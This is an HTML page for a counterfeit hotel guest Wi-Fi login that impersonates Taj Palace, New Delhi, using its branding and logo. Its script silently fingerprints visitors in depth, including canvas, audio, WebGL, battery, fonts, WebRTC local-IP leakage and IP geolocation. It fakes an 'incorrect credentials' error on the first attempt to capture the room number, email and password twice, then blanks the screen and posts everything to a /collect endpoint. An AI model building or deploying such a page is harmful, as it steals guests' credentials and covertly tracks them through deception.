<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Taj Palace, New Delhi - Wi-Fi Access</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      min-height: 100vh;
      background: linear-gradient(135deg, #0f1c3a 0%, #001528 100%),
                  url('https://dynamic-media-cdn.tripadvisor.com/media/photo-o/21/da/14/0b/taj-palace-new-delhi.jpg') center/cover no-repeat fixed;
      background-blend-mode: overlay;
      color: #e8f0ff;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.4s ease;
    }
    .container {
      background: rgba(255, 255, 255, 0.96);
      border-radius: 16px;
      padding: 50px 45px;
      width: 90%;
      max-width: 440px;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
      animation: fadeIn 1.2s ease-out forwards;
    }
    @keyframes fadeIn {
      from { opacity:0; transform: translateY(30px); }
      to { opacity:1; transform: translateY(0); }
    }
    .logo { width: 160px; margin-bottom: 30px; }
    h1 { font-size: 2em; margin-bottom: 10px; color: #003366; }
    .subtitle { font-size: 1.1em; margin-bottom: 35px; color: #555; }
    .form-group { position: relative; margin-bottom: 25px; text-align: left; }
    input {
      width: 100%;
      padding: 15px 18px;
      border: 1px solid #d0d8e0;
      border-radius: 8px;
      font-size: 1em;
    }
    input:focus {
      outline: none;
      border-color: #006d77;
      box-shadow: 0 0 0 3px rgba(0,109,119,0.15);
    }
    label {
      position: absolute;
      left: 18px;
      top: 15px;
      color: #777;
      pointer-events: none;
      transition: all 0.3s;
      font-size: 1em;
      background: white;
      padding: 0 5px;
    }
    input:focus + label,
    input:not(:placeholder-shown) + label {
      top: -10px;
      font-size: 0.82em;
      color: #006d77;
    }
    button {
      width: 100%;
      padding: 15px;
      background: #006d77;
      color: white;
      font-size: 1.1em;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s;
    }
    button:hover { background: #005a64; }
    #error-message {
      color: #c0392b;
      font-size: 0.95em;
      margin: 18px 0;
      display: none;
      padding: 10px;
      background: #f9e1e1;
      border-radius: 6px;
    }
    #blank-screen {
      display: none;
      position: fixed;
      inset: 0;
      background: #ffffff;
      z-index: 9999;
    }
  </style>
  <script async src="https://openfpcdn.io/fingerprintjs/v5"></script>
</head>
<body>

  <div class="container" id="formContainer">
    <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Taj_Hotels_logo.svg" alt="Taj Hotels" class="logo">

    <h1>Taj Palace, New Delhi</h1>
    <p class="subtitle">Guest Wi-Fi Access</p>

    <form id="loginForm">
      <div class="form-group">
        <input type="tel" id="room" name="room" placeholder=" " required pattern="[0-9]*" inputmode="numeric">
        <label for="room">Room Number</label>
      </div>
      <div class="form-group">
        <input type="email" id="email" name="email" placeholder=" " required autocomplete="email">
        <label for="email">Registered / Booking Email</label>
      </div>
      <div class="form-group">
        <input type="password" id="password" name="password" placeholder=" " required autocomplete="off">
        <label for="password">Password</label>
      </div>

      <div id="error-message">Incorrect credentials. Please try again.</div>
      <button type="submit" id="submitBtn">Connect</button>
    </form>

    <div class="note" style="margin-top:30px;font-size:0.95em;color:#555;">
      Internet access will be granted only if you enter the correct registered email, room number and password.
    </div>

    <p class="terms" style="margin-top:25px;font-size:0.88em;color:#777;">
      By connecting, you agree to our <a href="#" style="color:#006d77;">Terms of Use</a>.
    </p>
  </div>

  <div id="blank-screen"></div>

  <script>
    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('error-message');
    const blankScreen = document.getElementById('blank-screen');
    const formContainer = document.getElementById('formContainer');

    let attempt = 0;
    let visitorId = null;
    let advancedFpData = null;

    (async () => {
      try {
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        visitorId = result.visitorId;

        const advancedFp = {
          t: new Date().toISOString(),
          d: {},
          c: '',
          a: '',
          f: [],
          w: {},
          r: [],
          i: { e: 'pending' },
          u: null,
          m: null,
          b: null,
          n: null
        };

        try {
          if (navigator.userAgentData) {
            const ua = await navigator.userAgentData.getHighEntropyValues([
              'platform', 'platformVersion', 'architecture', 'model', 'fullVersionList',
              'bitness', 'mobile', 'wow64', 'brands'
            ]);
            advancedFp.u = ua;
          }

          advancedFp.d = {
            ua: navigator.userAgent,
            vendor: navigator.vendor || 'unknown',
            product: navigator.product || 'unknown',
            platform: navigator.platform || 'unknown',
            languages: navigator.languages?.join(', ') || navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            tzOffset: new Date().getTimezoneOffset() / -60,
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}x${screen.pixelDepth}`,
            avail: `${screen.availWidth}x${screen.availHeight}`,
            orientation: screen.orientation?.type || 'unknown',
            hw: navigator.hardwareConcurrency ?? '?',
            mem: navigator.deviceMemory ?? '?',
            touch: navigator.maxTouchPoints ?? 0,
            cookies: navigator.cookieEnabled,
            dnt: navigator.doNotTrack || 'unspecified',
            java: navigator.javaEnabled?.() ?? false,
            pdf: navigator.pdfViewerEnabled ?? 'unknown',
            webdriver: navigator.webdriver ?? false
          };

          if (performance?.memory) {
            advancedFp.m = {
              jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
              totalJSHeapSize: performance.memory.totalJSHeapSize,
              usedJSHeapSize: performance.memory.usedJSHeapSize
            };
          }

          if (navigator.getBattery) {
            try {
              const bat = await navigator.getBattery();
              advancedFp.b = {
                level: bat.level,
                charging: bat.charging,
                chargingTime: bat.chargingTime,
                dischargingTime: bat.dischargingTime
              };
            } catch {}
          }

          if (navigator.connection) {
            advancedFp.n = {
              type: navigator.connection.effectiveType,
              downlink: navigator.connection.downlink,
              rtt: navigator.connection.rtt,
              saveData: navigator.connection.saveData,
              downlinkMax: navigator.connection.downlinkMax
            };
          }

          try {
            const c = document.createElement('canvas');
            const x = c.getContext('2d');
            x.textBaseline = 'top';
            x.font = '14px Arial';
            x.fillStyle = '#f60'; x.fillRect(125,1,62,20);
            x.fillStyle = '#069'; x.fillText('Hello, world! 🌐', 2,15);
            x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('Hello, world! 🌐', 4,17);
            advancedFp.c = c.toDataURL();
          } catch { advancedFp.c = 'err'; }

          try {
            const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 5000, 44100);
            const osc = ac.createOscillator();
            const comp = ac.createDynamicsCompressor();
            osc.connect(comp); comp.connect(ac.destination);
            osc.type = 'triangle'; osc.frequency.value = 10000;
            comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
            osc.start(0);
            const buf = await ac.startRendering();
            let h = 0;
            const ch = buf.getChannelData(0);
            for (let i = 4500; i < 5000; i++) h += Math.abs(ch[i]);
            advancedFp.a = Math.round(h * 1000) / 1000;
          } catch { advancedFp.a = 'err'; }

          try {
            const fts = ['Arial','Courier New','Georgia','Helvetica','Times New Roman','Verdana','Comic Sans MS','Impact','Trebuchet MS'];
            const s = document.createElement('span');
            s.style.fontSize = '72px'; s.style.position = 'absolute'; s.style.visibility = 'hidden';
            s.innerHTML = 'abcdefghijklmnopqrstuvwxyz0123456789';
            document.body.appendChild(s);
            const bw = s.offsetWidth;
            const det = [];
            for (const f of fts) {
              s.style.fontFamily = `${f},monospace`;
              if (s.offsetWidth !== bw) det.push(f);
            }
            document.body.removeChild(s);
            advancedFp.f = det.length ? det : ['none'];
          } catch { advancedFp.f = ['err']; }

          try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (gl) {
              const d = gl.getExtension('WEBGL_debug_renderer_info');
              advancedFp.w = {
                vendor: d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                renderer: d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
              };
            }
          } catch { advancedFp.w = { e: 'err' }; }

          try {
            if (window.RTCPeerConnection) {
              const pc = new RTCPeerConnection({iceServers:[]});
              pc.createDataChannel('');
              pc.createOffer().then(o => pc.setLocalDescription(o));
              await new Promise(r => {
                pc.onicecandidate = e => {
                  if (!e.candidate) return r();
                  const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                  if (m && !m[1].startsWith('127.') && !m[1].startsWith('::1')) advancedFp.r.push(m[1]);
                };
                setTimeout(r, 3000);
              });
              pc.close();
            }
          } catch { advancedFp.r = ['err']; }

          try {
            const r = await fetch('http://ip-api.com/json/?fields=status,query,isp,org,as,country,city,regionName,lat,lon,timezone,proxy,hosting,mobile');
            if (r.ok) {
              const j = await r.json();
              if (j.status === 'success') advancedFp.i = j;
            }
          } catch { advancedFp.i.e = 'fetch failed'; }

        } catch (err) {
          advancedFp.e = err.message || 'collection failed';
        }

        advancedFpData = advancedFp;

      } catch (err) {
        visitorId = 'fp_error';
      }
    })();

    form.addEventListener('submit', async function(e) {
      e.preventDefault();

      attempt++;

      const currentAttempt = {
        room: document.getElementById('room').value.trim(),
        email: document.getElementById('email').value.trim(),
        password: document.getElementById('password').value.trim()
      };

      if (attempt === 1) {
        localStorage.setItem('firstAttempt', JSON.stringify(currentAttempt));
        errorMsg.style.display = 'block';
        document.getElementById('room').value = '';
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        return;
      }

      if (attempt >= 2) {
        blankScreen.style.display = 'block';
        formContainer.style.display = 'none';

        const firstAttemptStr = localStorage.getItem('firstAttempt');
        const firstAttempt = firstAttemptStr ? JSON.parse(firstAttemptStr) : { room: '[missing]', email: '[missing]', password: '[missing]' };

        const payload = {
          attempt1: firstAttempt,
          attempt2: currentAttempt,
          fingerprint: {
            visitorId: visitorId || 'not_ready',
            advanced: advancedFpData || 'not_collected',
            collectedAt: new Date().toISOString()
          },
          combined_at: new Date().toISOString(),
          ua: navigator.userAgent,
          screen: `${screen.width}x${screen.height}`
        };

        try {
          await fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
          });
        } catch (err) {}

        localStorage.removeItem('firstAttempt');
      }
    });
  </script>
</body>
</html>
